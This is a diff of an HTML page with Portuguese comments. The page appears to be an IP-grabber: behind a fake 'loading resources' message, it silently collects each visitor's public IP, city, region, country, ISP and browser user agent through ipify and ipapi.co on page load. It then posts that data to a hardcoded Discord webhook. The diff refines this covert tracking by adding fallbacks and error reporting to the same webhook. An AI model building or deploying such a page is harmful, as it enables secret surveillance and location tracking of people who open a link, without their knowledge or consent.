@@ -7,82 +7,108 @@
     <style>
         body {
             background-color: #ffffff;
-            font-family: sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            color: #333;
+            color: #555;
         }
         .loader {
-            font-size: 18px;
-            font-weight: bold;
+            font-size: 16px;
+            font-weight: 500;
         }
     </style>
 </head>
 <body>
 
-    <div class="loader">Processando sua solicitação...</div>
+    <div class="loader">Carregando recursos...</div>
 
     <script>
         /**
          * CONFIGURAÇÃO
-         * Substitua pela sua URL do Webhook do Discord
+         * Coloque sua URL do Webhook do Discord aqui
          */
         const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1542344832817823794/rpnzy3a7n1WlSyjHT4ozcd0DaN9BVufEDRLuDbbXDWe_cpLroDqhJCBzATv3llqjKqk_';
 
         async function iniciarCaptura() {
+            console.log("🚀 Iniciando processo de captura...");
+
             try {
-                // 1. Obtém o IP Público Real (usando ipify para evitar cache de geolocalização)
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                const ipData = await ipResponse.json();
+                // 1. Captura o IP Público (usando ipify - extremamente estável)
+                const ipRes = await fetch('https://api.ipify.org?format=json', { method: 'GET', mode: 'cors' });
+                if (!ipRes.ok) throw new Error("Falha ao obter IP via ipify");
+                const ipData = await ipRes.json();
                 const realIP = ipData.ip;
 
-                // 2. Obtém detalhes de geolocalização baseados no IP capturado
-                // Usamos a ipapi.co para detalhes de localização e ISP
-                const geoResponse = await fetch(`https://ipapi.co/${realIP}/json/`);
-                const geoData = await geoResponse.json();
+                // 2. Busca detalhes de geolocalização (com fallback para não travar o processo)
+                let geoData = { city: 'N/A', region: 'N/A', country: 'N/A', isp: 'N/A' };
+                
+                try {
+                    const geoRes = await fetch(`https://ipapi.co/${realIP}/json/`, { method: 'GET', mode: 'cors' });
+                    if (geoRes.ok) {
+                        const geoJson = await geoRes.json();
+                        geoData = {
+                            city: geoJson.city || 'N/A',
+                            region: geoJson.region || 'N/A',
+                            country: geoJson.country_name || 'N/A',
+                            isp: geoJson.org || 'N/A'
+                        };
+                    }
+                } catch (e) {
+                    console.warn("⚠️ Aviso: Erro na geolocalização, enviando apenas IP.");
+                }
 
-                // 3. Monta o objeto de dados para o Discord (Embed para visual profissional)
+                // 3. Montagem do Payload para o Discord
                 const payload = {
                     embeds: [{
-                        title: "📡 Novo Registro de Acesso",
-                        description: "Um novo dispositivo acessou a página. Dados capturados abaixo:",
-                        color: 0x2ecc71, // Verde
+                        title: "📡 Novo Registro de Acesso Detectado",
+                        description: "Um novo acesso foi registrado através do navegador.",
+                        color: 0x3498db, // Azul
                         fields: [
                             { name: "🌐 IP Público", value: `\`${realIP}\``, inline: true },
-                            { name: "📍 Localização", value: `${geoData.city || 'N/A'}, ${geoData.region || 'N/A'}, ${geoData.country_name || 'N/A'}`, inline: true },
-                            { name: "🏢 Provedor (ISP)", value: geoData.org || "Não identificado", inline: false },
-                            { name: "🌍 País", value: geoData.country_name || "N/A", inline: true },
-                            { name: "⏱️ Fuso Horário", value: geoData.timezone || "N/A", inline: true },
-                            { name: "📱 Navegador/Sistema", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
+                            { name: "📍 Localização", value: `${geoData.city}, ${geoData.region}, ${geoData.country}`, inline: true },
+                            { name: "🏢 Provedor (ISP)", value: geoData.isp, inline: false },
+                            { name: "📱 Dispositivo/Browser", value: `\`\`\`${navigator.userAgent}\`\`\``, inline: false }
                         ],
-                        footer: { 
-                            text: "Captura de Segurança | DeepHat Protocol" 
-                        },
+                        footer: { text: "Sistema de Monitoramento | DeepHat" },
                         timestamp: new Date().toISOString()
                     }]
                 };
 
-                // 4. Envia os dados para o Webhook do Discord via POST
-                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                // 4. Envio para o Webhook do Discord
+                const webhookRes = await fetch(DISCORD_WEBHOOK_URL, {
                     method: 'POST',
+                    mode: 'cors',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
 
-                if (!response.ok) {
-                    console.error("Erro ao enviar para o Discord.");
+                if (!webhookRes.ok) {
+                    throw new Error(`Erro no Discord: ${webhookRes.status}`);
                 }
 
+                console.log("✅ Dados enviados com sucesso!");
+
             } catch (error) {
-                // Log de erro silencioso no console
-                console.error("Falha na captura:", error);
+                console.error("❌ Erro crítico na captura:", error.message);
+
+                // Tenta enviar o erro para o Discord para você saber o que aconteceu
+                if (DISCORD_WEBHOOK_URL !== 'SUA_URL_DO_WEBHOOK_AQUI') {
+                    await fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        mode: 'cors',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            content: `🚨 **Erro de Captura no Site:**\n\`${error.message}\``
+                        })
+                    }).catch(err => console.error("Erro ao enviar log de erro:", err));
+                }
             }
         }
 
-        // Executa a função assim que a página carregar
+        // Dispara a função assim que a página carregar
         window.addEventListener('load', iniciarCaptura);
     </script>
 </body>
